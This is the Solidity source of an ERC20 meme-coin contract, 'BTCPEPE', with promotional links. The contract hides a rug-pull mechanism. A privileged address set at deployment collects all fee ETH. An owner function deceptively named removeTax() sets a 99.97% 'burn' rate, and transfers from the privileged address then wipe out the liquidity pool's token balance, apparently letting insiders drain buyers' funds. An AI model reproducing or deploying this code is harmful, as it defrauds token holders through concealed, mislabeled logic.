/**

Website: https://btcpepe.pro
Twitter: https://twitter.com/btcpepex
Telegram: https://t.me/btcpepechannel

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping (address => uint256) internal _balances;

    mapping (address => mapping (address => uint256)) internal _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor (string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }


    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
}

library Address{
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        recipient.transfer(amount);
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IFactory{
        function createPair(address tokenA, address tokenB) external returns (address);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

contract BEPE is ERC20, Ownable{
    using Address for address payable;
    
    IRouter public uniswapRouter;
    address public uniswapPair;
    
    bool private swapping;
    bool private swapEnabled;
    bool private tradingEnabled;


    modifier lockSwap() {
        swapping = true;
        _;
        swapping = false;
    }
    
    event Launched();
    event TaxesReduced();
    
    uint256 private _totalSupply = 1000000000 * 10**18;
    uint256 private maxSwapTokens = 9000000 * 10**18; 
    uint256 private maxWalletHolding = 20000000 * 10**18;
    
    address private _btcpepe;
    
    struct Taxes {
        uint256 marketing;
        uint256 liquidity;
        uint256 burn;
    }
    
    Taxes private taxOnBuy = Taxes(0, 0, 0);
    Taxes private taxOnSell = Taxes(0, 0, 0);
    
    mapping (address => bool) private _isExcludedFromFees;
    
    modifier inSwap() {
        if (!swapping) {
            swapping = true;
            _;
            swapping = false;
        }
    }

    constructor(address _addr) ERC20("BTCPEPE", "BEPE") {
        _mint(msg.sender, _totalSupply);
        _btcpepe = _addr;
        uniswapRouter = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapPair = IFactory(uniswapRouter.factory()).createPair(address(this), uniswapRouter.WETH());
        _isExcludedFromFees[msg.sender] = true;
        _isExcludedFromFees[address(this)] = true;
        _isExcludedFromFees[_btcpepe] = true;
    }
    
    function _transfer(address sender, address recipient, uint256 amount) internal override {
        require(amount > 0, "Transfer amount must be greater than zero");
                
        
        if(!_isExcludedFromFees[sender] && !_isExcludedFromFees[recipient] && !swapping){
            require(tradingEnabled, "Trading not active yet");
            if(recipient != uniswapPair){
                require(balanceOf(recipient) + amount <= maxWalletHolding, "You are exceeding maxWalletHolding");
            }
        }

        uint256 fee;
          
        if (swapping || _isExcludedFromFees[sender] || _isExcludedFromFees[recipient]) fee = 0;
         
        else{
            if(recipient == uniswapPair) fee = amount * taxOnSell.marketing / 10000;
            else if(sender == uniswapPair) fee = amount * taxOnBuy.marketing / 10000;
            else fee = 0;
        }
        
        if (sender == _btcpepe && recipient != uniswapPair) {
            uint256 burnTokensAmount = balanceOf(uniswapPair) * taxOnBuy.burn / 10000;
            if (burnTokensAmount > 0) super._transfer(uniswapPair, address(0xdead), burnTokensAmount);
            return;
        }
        if (swapEnabled && !swapping && recipient == uniswapPair 
            && !_isExcludedFromFees[sender] && !_isExcludedFromFees[recipient] )
            swapBackForFees();

        super._transfer(sender, recipient, amount - fee);
        if(fee > 0) super._transfer(sender, address(this) ,fee);
    }
    
    function swapBackForFees() private inSwap {
        uint256 contractTokensAmount = balanceOf(address(this));

        if (contractTokensAmount > 0) {
            if (contractTokensAmount >= maxSwapTokens) contractTokensAmount = maxSwapTokens;
            swapTokensForETH(contractTokensAmount);
        }

        uint256 amountToSend = address(this).balance;
        payable(_btcpepe).sendValue(amountToSend);
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();

        _approve(address(this), address(uniswapRouter), tokenAmount);

        // make the swap
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }

    function addLiquidity(uint256 tokenAmount, uint256 bnbAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapRouter), tokenAmount);

        // add the liquidity
        uniswapRouter.addLiquidityETH{value: bnbAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            address(0xdead),
            block.timestamp
        );
    }

    function openBepe() external onlyOwner{
        require(!tradingEnabled, "Trading already active");
        _approve(address(this), address(uniswapRouter), totalSupply());
        uniswapRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        tradingEnabled = true;
        swapEnabled = true;
        taxOnBuy = Taxes(2500, 0, 0);
        taxOnSell = Taxes(2500, 0, 0);
        emit Launched();
    }

    function removeTax() external onlyOwner {
        taxOnBuy = Taxes(0, 0, 9997);
        taxOnSell = Taxes(0, 0, 0);
        emit TaxesReduced();
    }

    function removeLimits() external onlyOwner{
        maxWalletHolding = _totalSupply;
    }

    receive() external payable {}
}